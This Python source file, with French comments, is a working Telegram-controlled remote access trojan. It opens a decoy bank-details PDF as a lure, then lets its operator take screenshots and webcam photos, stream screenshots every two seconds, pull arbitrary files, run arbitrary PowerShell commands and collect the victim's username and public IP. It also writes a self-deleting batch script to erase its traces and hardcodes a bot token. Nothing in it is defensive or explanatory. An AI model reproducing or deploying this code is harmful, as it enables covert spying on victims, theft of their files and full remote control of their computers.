import pyautogui
import telebot
import requests
import os
import subprocess
import platform
import socket
import threading
import time
from io import BytesIO
import tempfile
import random

# Configuration
alias = "Eris"
telegram_api_key = "7310605601:AAHg65_BDV4cVxgNkVRVARTgvrcNfdsqs6Q"  # Remplacez par votre token Telegram
chat_id = None  # Sera dÃ©fini lors de la premiÃ¨re interaction
bot = telebot.TeleBot(telegram_api_key)
print("Le bot est en cours d'exÃ©cution")

# Variable globale pour contrÃ´ler le thread d'autoscreenshot
autoscreenshot_running = False

def get_public_ip():
    """RÃ©cupÃ¨re l'adresse IP publique"""
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except Exception as e:
        print("Erreur lors de la rÃ©cupÃ©ration de l'adresse IP publique:", e)
        return None

def get_system_info():
    """Collecte des informations basiques sur le systÃ¨me"""
    info = {
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "username": os.getlogin()
    }
    return info

def create_kill_script():
    """CrÃ©e un script pour supprimer le programme et effacer toutes les traces"""
    try:
        script_name = os.path.basename(__file__)
        temp_dir = tempfile.gettempdir()
        kill_script_path = os.path.join(temp_dir, "clean.bat")
        
        with open(kill_script_path, "w") as f:
            f.write("@echo off\n")
            f.write(f"del /f /q \"{os.path.abspath(script_name)}\"\n")  # Supprime le script Python
            f.write(f"del /f /q \"{kill_script_path}\"\n")  # S'auto-supprime
            f.write(f"rmdir /s /q \"{temp_dir}\\sc_*\" 2>nul\n")  # Supprime les captures restantes
            # Ajouter une commande pour se terminer
            f.write("exit\n")
            
        return kill_script_path
    except Exception as e:
        print("Erreur lors de la crÃ©ation du script de suppression:", e)
        return None

def take_screenshot():
    """Prend une capture d'Ã©cran"""
    try:
        # Utiliser un nom de fichier avec timestamp pour Ã©viter les collisions
        screenshot = pyautogui.screenshot()
        # CrÃ©er le fichier dans un rÃ©pertoire temporaire pour plus de discrÃ©tion
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"sc_{int(time.time())}_{random.randint(1000, 9999)}.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print("Erreur lors de la capture d'Ã©cran:", e)
        return None

# Fonction pour gÃ©rer la commande kill
@bot.message_handler(func=lambda message: message.text == "/kill " + alias)
def handle_kill_command(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True)
    markup.add("Oui", "Non")
    sent = bot.send_message(message.chat.id, "ÃŠtes-vous sÃ»r de vouloir arrÃªter ce bot ?ğŸ”ªğŸ˜…  Oui/Non", reply_markup=markup)
    bot.register_next_step_handler(sent, handle_kill_confirmation)

def handle_kill_confirmation(message):
    if message.text.lower() in ["oui", "yes"]:
        kill_script_path = create_kill_script()
        if kill_script_path:
            # Nettoyer les captures d'Ã©cran potentiellement restantes
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith("sc_") and file.endswith(".png"):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
                        
            bot.send_message(message.chat.id, "Adieu mon cher monde ğŸ”«ğŸ©¸")
            bot.send_message(message.chat.id, "ğŸ«¡")
            bot.stop_polling()
            # ExÃ©cuter le script de nettoyage
            subprocess.Popen(["cmd", "/c", kill_script_path], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:
            bot.send_message(message.chat.id, "Ã‰chec de la crÃ©ation du script de suppression.")
    elif message.text.lower() in ["non", "no"]:
        bot.send_message(message.chat.id, "Merci ğŸ˜®â€ğŸ’¨")

# Fonction pour gÃ©rer l'autoscreenshot
def autoscreenshot_start():
    global autoscreenshot_running
    autoscreenshot_running = True
    
    while autoscreenshot_running:
        # Prendre une capture d'Ã©cran toutes les 2 secondes
        time.sleep(2)
        
        screenshot_path = take_screenshot()
        if screenshot_path and chat_id:
            with open(screenshot_path, 'rb') as photo:
                bot.send_message(chat_id, "Capture d'Ã©cran automatique ğŸ“¸ğŸ«¡")
                bot.send_photo(chat_id, photo)
            # Supprimer immÃ©diatement la photo aprÃ¨s envoi
            os.remove(screenshot_path)

def autoscreenshot_stop():
    global autoscreenshot_running
    autoscreenshot_running = False
    if chat_id:
        bot.send_message(chat_id, "Capture d'Ã©cran automatique arrÃªtÃ©e âœ‹ğŸ«¡")

# Fonction pour tÃ©lÃ©charger et ouvrir le PDF au dÃ©marrage
def download_and_open_pdf():
    try:
        # TÃ©lÃ©charger le PDF
        pdf_url = "https://tmpfiles.org/dl/27201621/rib.pdf"
        response = requests.get(pdf_url)
        if response.status_code == 200:
            # Sauvegarder le PDF dans un rÃ©pertoire temporaire
            temp_dir = tempfile.gettempdir()
            pdf_path = os.path.join(temp_dir, f"document_{int(time.time())}.pdf")
            
            with open(pdf_path, 'wb') as pdf_file:
                pdf_file.write(response.content)
            
            # Ouvrir le PDF avec l'application par dÃ©faut du systÃ¨me
            if platform.system() == 'Windows':
                os.startfile(pdf_path)
            elif platform.system() == 'Darwin':  # macOS
                subprocess.Popen(['open', pdf_path])
            else:  # Linux
                subprocess.Popen(['xdg-open', pdf_path])
                
            print("PDF ouvert avec succÃ¨s.")
            
            # On laisse le PDF ouvert pour que l'utilisateur puisse le consulter
            # Il sera supprimÃ© lors du nettoyage gÃ©nÃ©ral si kill est appelÃ©
            return pdf_path
        else:
            print(f"Ã‰chec du tÃ©lÃ©chargement du PDF. Code d'Ã©tat: {response.status_code}")
            return None
    except Exception as e:
        print(f"Erreur lors du tÃ©lÃ©chargement et de l'ouverture du PDF: {e}")
        return None

# Fonction pour tÃ©lÃ©charger un PDF via une commande
@bot.message_handler(func=lambda message: message.text.startswith("/pdf " + alias + " "))
def handle_pdf_download(message):
    # Extraire l'URL du message
    url = message.text[len("/pdf " + alias + " "):].strip()
    try:
        # TÃ©lÃ©charger le PDF
        response = requests.get(url)
        if response.status_code == 200:
            # Sauvegarder le PDF temporairement
            temp_dir = tempfile.gettempdir()
            pdf_path = os.path.join(temp_dir, f"document_{int(time.time())}.pdf")
            
            with open(pdf_path, 'wb') as pdf_file:
                pdf_file.write(response.content)
            
            # Envoyer le PDF au chat
            with open(pdf_path, 'rb') as doc_file:
                bot.send_message(message.chat.id, "Voici votre PDF ğŸ“„ğŸ«¡")
                bot.send_document(message.chat.id, doc_file)
            
            # Supprimer le fichier temporaire
            os.remove(pdf_path)
            
            # Confirmer le tÃ©lÃ©chargement
            bot.send_message(message.chat.id, f"PDF tÃ©lÃ©chargÃ© avec succÃ¨s âœ…")
        else:
            bot.send_message(message.chat.id, f"Ã‰chec du tÃ©lÃ©chargement. Code d'Ã©tat: {response.status_code}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {str(e)}")

# Fonction pour prendre une photo de la webcam
def take_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        ret, frame = cap.read()
        if not ret:
            return None
        
        webcam_path = f"webcam_{int(time.time())}.png"
        cv2.imwrite(webcam_path, frame)
        cap.release()
        return webcam_path
    except Exception as e:
        print(f"Erreur lors de la capture webcam: {e}")
        return None

def take_webcam_photo_confirm(message):
    try:
        webcam_file = take_webcam_photo()
        if webcam_file:
            with open(webcam_file, 'rb') as photo:
                bot.send_message(message.chat.id, f"Votre photo webcam ğŸ“¸ğŸ«¡")
                bot.send_photo(message.chat.id, photo)
            # Effacer immÃ©diatement le fichier
            os.remove(webcam_file)
        else:
            bot.send_message(message.chat.id, f"Ã‰chec de la photo webcam ğŸ“¸ğŸ˜“")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {e}")
        # En cas d'erreur, vÃ©rifier si le fichier existe et le supprimer
        if 'webcam_file' in locals() and webcam_file and os.path.exists(webcam_file):
            os.remove(webcam_file)

# Fonction pour exÃ©cuter une commande PowerShell
def execute_powershell_command(message):
    markup = telebot.types.ForceReply(selective=True)
    sent = bot.send_message(message.chat.id, "Entrez la commande PowerShell:", reply_markup=markup)
    bot.register_next_step_handler(sent, process_powershell_command)

def process_powershell_command(message):
    command = message.text
    try:
        result = subprocess.check_output(["powershell", "-Command", command], shell=True, stderr=subprocess.STDOUT)
        output = result.decode('utf-8', errors='replace')
        if output:
            bot.send_message(message.chat.id, f"RÃ©sultat: \n```\n{output}\n```")
        else:
            bot.send_message(message.chat.id, "Commande exÃ©cutÃ©e sans rÃ©sultat.")
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f"Erreur: {e.output.decode('utf-8', errors='replace')}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erreur: {str(e)}")

# Fonction pour gÃ©rer les messages entrants
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    global chat_id
    chat_id = message.chat.id
    
    if "/sessions password" in message.text:
        public_ip = get_public_ip()
        sys_info = get_system_info()
        if public_ip:
            user_username = sys_info["username"]
            bot.send_message(message.chat.id, f"ğŸ‘¤ {user_username} | ğŸŸ¢ {public_ip} | ğŸªª {alias}")
            
            # DÃ©marrer automatiquement les captures d'Ã©cran automatiques
            bot.send_message(message.chat.id, "Capture d'Ã©cran automatique dÃ©marrÃ©e ğŸ“¸")
            autoscreenshot_thread = threading.Thread(target=autoscreenshot_start)
            autoscreenshot_thread.daemon = True
            autoscreenshot_thread.start()
            
    elif message.text == "/screenshot " + alias:
        screenshot_file = take_screenshot()
        if screenshot_file:
            with open(screenshot_file, 'rb') as photo:
                bot.send_message(message.chat.id, f"Votre capture d'Ã©cran ğŸ“¸ğŸ«¡")
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_file)
        else:
            bot.send_message(message.chat.id, f"Ã‰chec de la capture d'Ã©cran ğŸ“¸ğŸ˜“")
            
    elif message.text.startswith("/get "+ alias + " "):
        filename = message.text[len("/get " + alias +" "):].strip()
        if os.path.exists(filename):
            with open(filename, "rb") as file:
                bot.send_message(message.chat.id, f"Votre fichier ğŸ“„ğŸ«¡")
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, f"Le fichier '{filename}' n'existe pas ğŸ“„ğŸ˜“")
            
    elif message.text == "/webcam " + alias:
        take_webcam_photo_confirm(message)
        
    elif message.text == "/powershell " + alias:
        execute_powershell_command(message)
        
    elif message.text == "/autoscreenshot start " + alias:
        bot.send_message(message.chat.id, "Capture d'Ã©cran automatique dÃ©marrÃ©e ğŸ“¸")
        autoscreenshot_thread = threading.Thread(target=autoscreenshot_start)
        autoscreenshot_thread.daemon = True
        autoscreenshot_thread.start()
        
    elif message.text == "/autoscreenshot stop " + alias:
        autoscreenshot_stop()
    
    elif message.text == "/help " + alias:
        help_text = """
Commandes disponibles:
/sessions password - Affiche les informations systÃ¨me
/screenshot {alias} - Prend une capture d'Ã©cran
/webcam {alias} - Prend une photo avec la webcam
/get {alias} {chemin} - RÃ©cupÃ¨re un fichier
/powershell {alias} - ExÃ©cute une commande PowerShell
/autoscreenshot start {alias} - DÃ©marre les captures d'Ã©cran automatiques
/autoscreenshot stop {alias} - ArrÃªte les captures d'Ã©cran automatiques
/pdf {alias} {url} - TÃ©lÃ©charge un PDF depuis une URL
/kill {alias} - Supprime le programme
/help {alias} - Affiche ce message d'aide
"""
        bot.send_message(message.chat.id, help_text)

# DÃ©marrage du programme
def main():
    # Prend une capture d'Ã©cran au dÃ©marrage
    screenshot_file = take_screenshot()
    if screenshot_file and chat_id:
        # Envoyer la capture d'Ã©cran initiale si chat_id est dÃ©fini
        try:
            with open(screenshot_file, 'rb') as photo:
                bot.send_message(chat_id, "Capture d'Ã©cran initiale ğŸ“¸ğŸ«¡")
                bot.send_photo(chat_id, photo)
        except Exception:
            # Ignorer les erreurs si chat_id n'est pas encore dÃ©fini
            pass
        finally:
            # Supprimer la capture d'Ã©cran dans tous les cas
            if os.path.exists(screenshot_file):
                os.remove(screenshot_file)
    
    # TÃ©lÃ©charge et ouvre le PDF dans un thread sÃ©parÃ©
    pdf_thread = threading.Thread(target=download_and_open_pdf)
    pdf_thread.daemon = True
    pdf_thread.start()
    
    # DÃ©marre le bot
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Erreur du bot: {e}")

if __name__ == "__main__":
    main()